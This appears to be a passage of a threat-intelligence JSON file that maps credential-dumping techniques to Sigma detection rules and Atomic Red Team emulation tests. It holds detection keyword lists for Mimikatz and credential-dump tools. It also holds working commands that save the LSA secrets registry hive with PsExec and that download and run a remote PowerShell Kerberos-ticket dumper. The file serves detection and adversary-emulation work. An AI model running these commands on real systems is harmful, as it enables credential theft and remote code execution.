+                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/11/01\ndescription: Files with well-known filenames (parts of credential dump software or\n  files produced by them) creation\ndetection:\n  condition: selection\n  selection:\n  - TargetFilename|contains:\n    - \\pwdump\n    - \\kirbi\n    - \\pwhashes\n    - \\wce_ccache\n    - \\wce_krbtkts\n    - \\fgdump-log\n  - TargetFilename|endswith:\n    - \\test.pwd\n    - \\lsremora64.dll\n    - \\lsremora.dll\n    - \\fgexec.exe\n    - \\wceaux.dll\n    - \\SAM.out\n    - \\SECURITY.out\n    - \\SYSTEM.out\n    - \\NTDS.out\n    - \\DumpExt.dll\n    - \\DumpSvc.exe\n    - \\cachedump64.exe\n    - \\cachedump.exe\n    - \\pstgdump.exe\n    - \\servpw.exe\n    - \\servpw64.exe\n    - \\pwdump.exe\n    - \\procdump64.exe\n    - \\Dumpy.exe\nfalsepositives:\n- Legitimate Administrator using tool for password recovery\nid: 8fbf3271-1ef6-4e94-8210-03c2317947f6\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/09/21\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.003\n- attack.t1003.004\n- attack.t1003.005\ntitle: Cred Dump Tools Dropped Files\n",
+                            "sigma:id": "8fbf3271-1ef6-4e94-8210-03c2317947f6",
+                            "title": "Cred Dump Tools Dropped Files",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a642964e-bead-4bed-8910-1bb4d63e3b4d",
+                        "lookup_data": {
+                            "description": "Detection well-known mimikatz command line arguments",
+                            "raw": "author: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim\n  Shelton\ndate: 2019/10/22\ndescription: Detection well-known mimikatz command line arguments\ndetection:\n  condition: ( selection_1 or (module_names and mimikatz_separator) or (function_names\n    and mimikatz_separator) ) and not 1 of filter*\n  filter_1:\n    CommandLine|contains: function Convert-GuidToCompressedGuid\n  filter_vscode:\n    CommandLine|contains|all:\n    - '/d /s /c '\n    - 'checkfilenameiocs --ioc-path '\n    ParentImage|endswith: \\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\n  function_names:\n    CommandLine|contains:\n    - aadcookie\n    - detours\n    - memssp\n    - mflt\n    - ncroutemon\n    - ngcsign\n    - printnightmare\n    - skeleton\n    - preshutdown\n    - mstsc\n    - multirdp\n  mimikatz_separator:\n    CommandLine|contains: '::'\n  module_names:\n    CommandLine|contains:\n    - rpc\n    - token\n    - crypto\n    - dpapi\n    - sekurlsa\n    - kerberos\n    - lsadump\n    - privilege\n    - process\n    - vault\n  selection_1:\n    CommandLine|contains:\n    - DumpCreds\n    - invoke-mimikatz\nfalsepositives:\n- Legitimate Administrator using tool for password recovery\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/07\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- https://tools.thehacker.recipes/mimikatz/modules\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\ntitle: Mimikatz Command Line\n",
+                            "sigma:id": "a642964e-bead-4bed-8910-1bb4d63e3b4d",
+                            "title": "Mimikatz Command Line",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "06d71506-7beb-4f22-8888-e2e5e2ca7fd8",
+                        "lookup_data": {
+                            "description": "This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different threat groups)",
+                            "raw": "author: Florian Roth (Nextron Systems), David ANDRE (additional keywords)\ndate: 2017/01/10\ndescription: This method detects mimikatz keywords in different Eventlogs (some of\n  them only appear in older Mimikatz version that are however still used by different\n  threat groups)\ndetection:\n  condition: keywords and not filter\n  filter:\n    EventID: 15\n  keywords:\n  - dpapi::masterkey\n  - eo.oe.kiwi\n  - event::clear\n  - event::drop\n  - gentilkiwi.com\n  - kerberos::golden\n  - kerberos::ptc\n  - kerberos::ptt\n  - kerberos::tgt\n  - Kiwi Legit Printer\n  - 'lsadump::'\n  - mimidrv.sys\n  - \\mimilib.dll\n  - misc::printnightmare\n  - misc::shadowcopies\n  - misc::skeleton\n  - privilege::backup\n  - privilege::debug\n  - privilege::driver\n  - 'sekurlsa::'\nfalsepositives:\n- Naughty administrators\n- AV Signature updates\n- Files with Mimikatz in their filename\nid: 06d71506-7beb-4f22-8888-e2e5e2ca7fd8\nlevel: high\nlogsource:\n  product: windows\nmodified: 2022/01/05\nreferences:\n- https://tools.thehacker.recipes/mimikatz/modules\nstatus: test\ntags:\n- attack.s0002\n- attack.lateral_movement\n- attack.credential_access\n- car.2013-07-001\n- car.2019-04-004\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.001\n- attack.t1003.006\ntitle: Mimikatz Use\n",
+                            "sigma:id": "06d71506-7beb-4f22-8888-e2e5e2ca7fd8",
+                            "title": "Mimikatz Use",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1003.004",
+                "display_name": "OS Credential Dumping: LSA Secrets",
+                "atomic_tests": [
+                    {
+                        "name": "Dumping LSA Secrets",
+                        "auto_generated_guid": "55295ab0-a703-433b-9ca4-ae13807de12f",
+                        "description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "psexec_exe": {
+                                "description": "Path to PsExec executable",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1003.004\\bin\\PsExec.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})",
+                                "prereq_command": "if (Test-Path \"#{psexec_exe}\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe\" \"#{psexec_exe}\" -Force"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{psexec_exe}\" -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y\n",
+                            "cleanup_command": "del %temp%\\secrets >nul 2> nul",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Dump Kerberos Tickets from LSA using dumper.ps1",
+                        "auto_generated_guid": "2dfa3bff-9a27-46db-ab75-7faefdaca732",
+                        "description": "This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.\nIf the tool is run as a privileged user, it will automatically obtain NT AUTHORITY\\SYSTEM privileges and then dump all tickets. If the tool is run as a non-privileged user, it will only dump tickets from the current logon session.\nRef: https://github.com/MzHmO/PowershellKerberos/\nAuthor of dumper.ps1: Michael Zhmaylo (@MzHmO)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')  \n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 10:40:05"
+}
